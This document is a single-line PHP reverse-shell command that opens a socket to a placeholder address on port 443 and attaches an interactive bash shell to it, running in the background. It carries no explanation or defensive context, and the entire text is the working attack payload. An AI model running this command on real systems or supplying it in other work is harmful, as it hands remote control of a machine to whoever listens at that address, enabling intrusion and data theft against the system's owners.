php -r '$sock=fsockopen("ipaddress",443);exec("/bin/bash -i <&3 >&3 2>&3");' &
